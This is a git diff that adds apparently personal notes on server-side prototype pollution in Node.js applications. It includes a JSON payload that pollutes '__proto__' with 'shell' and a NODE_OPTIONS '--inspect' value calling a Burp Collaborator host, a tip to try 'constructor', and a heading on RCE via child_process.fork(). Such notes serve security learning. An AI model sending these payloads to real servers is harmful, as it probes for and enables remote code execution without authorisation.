@@ -6,3 +6,15 @@ There are a number of potential command execution sinks in Node, many of which o
 
 best way to identify these requests is by polluting the prototype with a payload that triggers 
 an interaction with Burp Collaborator when called.
+
+NODE_OPTIONS is an envronment variable in node applciations it can be leveraged to use for prototype pollution
+
+eg:-- this paylaod acan be used to detect server side prototype pollution that can cause RCE                  --------------->>>> DETECTION
+"__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
+}
+try to chhange proto to construcrtor if not works
+
+EXPLOITING METHOD 1+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Remote code execution via child_process.fork()
